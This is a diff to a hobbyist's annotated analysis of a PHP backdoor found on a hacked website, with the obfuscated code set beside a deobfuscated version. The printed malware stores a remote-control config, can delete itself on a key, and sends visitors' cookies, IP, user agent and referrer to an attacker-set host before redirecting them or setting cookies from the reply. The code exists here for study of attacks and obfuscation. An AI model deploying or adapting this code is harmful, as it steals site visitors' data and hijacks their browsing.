@@ -3,10 +3,13 @@
 //*  Analysis  of the hack file                       *//
 //*****************************************************//
 //
+//  I'm using this as a way to understand hack attempts and security
+//  THere's also some nifty obfuscation in here that we all can learn from!
+//
 // Notes: 
 // - Run this code at your own risk
 //
-// I've rearranged the hack code for the readability and analysis - it may not work (not that you should ever run this)
+// I've rearranged the hack code for the readability and analysis 
 
 
 
@@ -125,104 +128,113 @@ $mode=$_REQUEST[_654327255(4)]; // $mode = $_REQUEST['mode'];
 			$scr=$snn;																			$scr=$snn;
 		}																					}
 		$getlpa=file($scr);																	$getlpa=file($scr);
-		$strng=$getlpa[0];																	// oddly enough, not needed!
+		$strng=$getlpa[0];																	// <---- oddly enough, not needed!
 		$file=file($scr);																	$file=file($scr) 
 																							
 		for($i=0;$i<sizeof($file);$i++)														for($i=0;$i<sizeof($file);$i++)
 			if($i==0){																			if($i==0){
-				$c[_654327255(26)]=$_POST[_654327255(27)];											$c[_654327255(26)]=$_POST[_654327255(27)];
-				$c[_654327255(28)]=$_POST[_654327255(29)];											$c[_654327255(28)]=$_POST[_654327255(29)];
-				$c[_654327255(30)]=$_POST[_654327255(31)];											$c[_654327255(30)]=$_POST[_654327255(31)];
-				$c[_654327255(32)]=$_POST[_654327255(33)];											$c[_654327255(32)]=$_POST[_654327255(33)];
-				$c[_654327255(34)]=$_POST[_654327255(35)];											$c[_654327255(34)]=$_POST[_654327255(35)];
-				$c[_654327255(34)]=$_POST[_654327255(35)];											$c[_654327255(34)]=$_POST[_654327255(35)];
+				$c[_654327255(26)]=$_POST[_654327255(27)];											$c['url']=$_POST['ptds'];
+				$c[_654327255(28)]=$_POST[_654327255(29)];											$c['ip']=$_POST['ptdsip'];
+				$c[_654327255(30)]=$_POST[_654327255(31)];											$c['lin']=$_POST['pto'];
+				$c[_654327255(32)]=$_POST[_654327255(33)];											$c['id']=$_POST['pesdid'];
+				$c[_654327255(34)]=$_POST[_654327255(35)];											$c['key']=$_POST['pkey'];
+				$c[_654327255(34)]=$_POST[_654327255(35)];											// repeat of previous statement
 				$file[$i]="<?\$cfg='$cfg'; ?>\n";													$file[$i]="<?\$cfg='$cfg'; ?>\n";
 			}																				}
 																						
-		$fp=fopen($scr,_654327255(36));														// !!!!!!!!!!!!!Stopped HERE !!!!!!!!!!!!!!!!!!!!!!!!!!!!
-																						
-		if(fputs($fp,implode(_654327255(37),$file))) die(_654327255(38));				
-																						
-		fclose($fp);																	
-	}																					
+		$fp=fopen($scr,_654327255(36));														$fp=fopen($scr,'w');														
+																							
+		if(fputs($fp,implode(_654327255(37),$file))) die(_654327255(38));					if(fputs($fp,implode('',$file))) die('Saved\n');					
+																							
+		fclose($fp);																		fclose($fp);
+	}																					}
 	
-	if($mode== _654327255(39)AND $c[_654327255(40)]==$_REQUEST[_654327255(41)]){
-		chmod(_654327255(42),$_SERVER[_654327255(43)]);
+	if($mode== _654327255(39)AND $c[_654327255(40)]==$_REQUEST[_654327255(41)]){		if($mode== 'kill' AND $c['key']==$_REQUEST['key']){
+		chmod(_654327255(42),$_SERVER[_654327255(43)]);										chmod('777',$_SERVER['SCRIPT_FILENAME']);
 		
-		if(unlink($_SERVER[_654327255(44)]))die(_654327255(45));}
+		if(unlink($_SERVER[_654327255(44)]))die(_654327255(45));}							if(unlink($_SERVER['SCRIPT_FILENAME']))die('ok\n'));}
 		
-		$dom=explode(_654327255(46),$c[_654327255(47)]);
+		$dom=explode(_654327255(46),$c[_654327255(47)]);									$dom=explode('/',$c['url']);
 		
-		$dom=$dom[2];
-		$dhost=$dom;
-		if($c[_654327255(48)]){
-			$dom=$c[_654327255(49)];
-		}
-		$fp=fsockopen($dom,80,$errno,$errstr,2);
+		$dom=$dom[2];																		$dom=$dom[2];
+		$dhost=$dom;																		$dhost=$dom;
+		if($c[_654327255(48)]){																if($c['ip']){
+			$dom=$c[_654327255(49)];															$dom=$c['ip'];
+		}																					}
+		$fp=fsockopen($dom,80,$errno,$errstr,2);											$fp=fsockopen($dom,80,$errno,$errstr,2);
 		
-		if(!$fp){
-			$res=1;
-		} else {
-			$t_dom=urlencode(_654327255(50) .$_SERVER[_654327255(51)] .$_SERVER[_654327255(52)]);
-			$t_ref=urlencode($_SERVER[HTTP_REFERER]);$t_ip=urlencode($_SERVER[_654327255(53)]);
-			$t_prox=_654327255(54);
+		if(!$fp){																			if(!$fp){
+			$res=1;																				$res=1;
+		} else {																			} else {
+			$t_dom=urlencode(_654327255(50) .$_SERVER[_654327255(51)] .						$t_dom=urlencode('https://' .$_SERVER['HTTP_HOST'] . 
+					$_SERVER[_654327255(52)]);																	$_SERVER['SCRIPT_NAME']);
+			$t_ref=urlencode($_SERVER[HTTP_REFERER]);										$t_ref=urlencode($_SERVER[HTTP_REFERER]);
+			$t_ip=urlencode($_SERVER[_654327255(53)]);										$t_ip=urlencode($_SERVER['REMOTE_ADDR']);
+			$t_prox=_654327255(54);															$t_prox='no';
 			
-			if($_SERVER[_654327255(55)]){ 
-				$t_prox=_654327255(56);
-			}
+			if($_SERVER[_654327255(55)]){ 													if($_SERVER['HTTP_X_FORWARDED_FOR']){ 
+				$t_prox=_654327255(56);															$t_prox='yes';
+			}																				}
 			
-			$t_agent=urlencode($_SERVER[_654327255(57)]);
+			$t_agent=urlencode($_SERVER[_654327255(57)]);									$t_agent=urlencode($_SERVER['HTTP_USER_AGENT']);
 			
-			foreach($_COOKIE as $c[_654327255(58)]=>$val){
-				$t_cookie=$t_cookie ._654327255(59) .$c[_654327255(60)] ._654327255(61) .$val;
-			}
+			foreach($_COOKIE as $c[_654327255(58)]=>$val){									foreach($_COOKIE as $c['key']=>$val){
+				$t_cookie=$t_cookie ._654327255(59) .											$t_cookie=$t_cookie .'&' . 'key' .'=' .$val;										
+					$c[_654327255(60)] ._654327255(61) .$val;								
+			}																				}
 			
-			$t_cookie=urlencode($t_cookie);
+			$t_cookie=urlencode($t_cookie);													$t_cookie=urlencode($t_cookie);
 			
-			if(empty($t_cookie)){
-				$t_cookie=urlencode($_SERVER[_654327255(62)]);
-			}
+			if(empty($t_cookie)){															if(empty($t_cookie)){
+				$t_cookie=urlencode($_SERVER[_654327255(62)]);									$t_cookie=urlencode($_SERVER['QUERY_STRING']);
+			}																				}
 			
-			$out=_654327255(63) .$c[_654327255(64)] ._654327255(65) .$t_dom ._654327255(66) .$t_ref ._654327255(67) .$t_ip ._654327255(68) .$t_prox ._654327255(69) .$t_agent ._654327255(70) .$t_cookie ._654327255(71) .$c[_654327255(72)] ._654327255(73);
-			$out .= _654327255(74) .$dhost ._654327255(75);$out .= _654327255(76);fwrite($fp,$out);
+			$out=_654327255(63) .$c[_654327255(64)] ._654327255(65) .$t_dom .				$out='GET' .$c['url'] . '?dom=' .$t_dom .
+				_654327255(66) .$t_ref ._654327255(67) .$t_ip ._654327255(68) .					'&ref' .$t_ref . '&ip=' .$t_ip . '&prox=' .
+				$t_prox ._654327255(69) .$t_agent ._654327255(70) .$t_cookie .					$t_prox . '&agent=' .$t_agent . '&cookie=' .$t_cookie .
+				_654327255(71) .$c[_654327255(72)] ._654327255(73);								'&esdid' . $c['id'] . ' HTTP/1.0\n';
+			$out .= _654327255(74) .$dhost ._654327255(75);									$out .= 'HOST:' .$dhost . ' \n';
+			$out .= _654327255(76);															$out .= 'Connection: Close\n';
+			fwrite($fp,$out);																fwrite($fp,$out);
 			
-			while(!feof($fp)){
-				$str=fgets($fp,128);$ch.=$str;
-				if($str== _654327255(77)&& empty($he)){
-					$he=_654327255(78);
-				}
+			
+			while(!feof($fp)){																while(!feof($fp)){
+				$str=fgets($fp,128);$ch.=$str;													$str=fgets($fp,128);$ch.=$str;
+				if($str== _654327255(77)&& empty($he)){											if($str== ' \n' && empty($he)){
+					$he=_654327255(78);																$he='do';
+				}																				}
 				
-				if($he== _654327255(79)){$goto.=$str;}
-			}
+				if($he== _654327255(79)){$goto.=$str;}											if($he== 'do'){$goto.=$str;}
+			}																				}
 				
-			fclose($fp);
-		}
+			fclose($fp);																	fclose($fp);
+		}																				}
+
+		$goto=substr($goto,2);															$goto=substr($goto,2);
+		$ch=explode(_654327255(80),$ch);												$ch=explode(' ',$ch);
 		
-		$goto=substr($goto,2);
-		$ch=explode(_654327255(80),$ch);
+		if($res){																		if($res){
+			$goto=$c[_654327255(81)];														$goto=$c['lin'];
+		} 																				}
 		
-		if($res){
-			$goto=$c[_654327255(81)];
-		} 
+		if($ch[1]== _654327255(82)){}													if($ch[1]== '200'){}
+		else{$goto=$c[_654327255(83)];}													else{$goto=$c['lin'];}
 		
-		if($ch[1]== _654327255(82)){}
-		else{$goto=$c[_654327255(83)];}
+		$gotoe=explode(_654327255(84),$goto);											$gotoe=explode('://',$goto);
 		
-		$gotoe=explode(_654327255(84),$goto);
+		If($gotoe[0]== _654327255(85)){													If($gotoe[0]== 'http'){
+			header(_654327255(86));															header('HTTP/1.1 302 Found');
+			header(_654327255(87) .$goto);													header('Location: ' .$goto);
+		}																				}
 		
-		If($gotoe[0]== _654327255(85)){
-			header(_654327255(86));
-			header(_654327255(87) .$goto);
-		}
+		$goto_body=substr($goto,7);														$goto_body=substr($goto,7);
+		If($gotoe[0]== _654327255(88)){													If($gotoe[0]== 'cook')){
+			$gotoee=explode(_654327255(89),$goto_body);										$gotoee=explode('&',$goto_body);
+			foreach($gotoee as $setcook){													foreach($gotoee as $setcook){
+				$set=explode(_654327255(90),$setcook);											$set=explode('='),$setcook);
+				setcookie($set[0],$set[1]);														setcookie($set[0],$set[1]);
+			}																				}
+		}																				}
 		
-		$goto_body=substr($goto,7);
-		If($gotoe[0]== _654327255(88)){
-			$gotoee=explode(_654327255(89),$goto_body);
-			foreach($gotoee as $setcook){
-				$set=explode(_654327255(90),$setcook);
-				setcookie($set[0],$set[1]);
-			}
-		}
-		
-		If($gotoe[0]== _654327255(91)){echo $goto_body;} 
+		If($gotoe[0]== _654327255(91)){echo $goto_body;} 								If($gotoe[0]== 'echo'){echo $goto_body;} 
 ?>
